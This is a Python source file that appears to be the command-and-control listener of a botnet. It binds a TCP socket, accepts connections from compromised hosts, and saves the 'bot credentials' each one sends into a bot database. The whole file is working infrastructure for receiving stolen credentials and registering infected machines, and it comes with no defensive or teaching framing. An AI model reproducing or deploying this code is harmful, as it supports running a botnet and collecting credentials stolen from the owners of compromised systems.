# Listens and appends new bot entries to database

import socket
import sys
import threading
import json

import database

from defs import CNC_SERV_ADDR, CNC_SERV_PORT, MAX_BACKLOG

def handle_client(client):
    '''
        Sends its credentials to the CNC server

        * client - the vulernable host
    '''

    resp = client.recv(4096)
    try:
        data = json.loads(resp)
        print('Received new bot credentials: %s' % data)
    except:
        print('[-] Unable to read response')
    finally:
        client.close()

    database.create_bot_entry(data)

if __name__ == '__main__':
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((CNC_SERV_ADDR, CNC_SERV_PORT))
        server.listen(MAX_BACKLOG)
        print(
            '[*] Listening on %s:%d'
            % (CNC_SERV_ADDR, CNC_SERV_PORT)
        )
    except:
        print('[!] Failed to bind address! Shutting down...')
        sys.exit(1)

    while True:
        (client, addr) = server.accept()
        print(
            '[*] Accepted connection from %s:%d' % (addr[0], addr[1])
        )
        client_handler = threading.Thread(
            target=handle_client,
            args=(client,)
        )
        client_handler.start()
        client_handler.join()

    server.close()
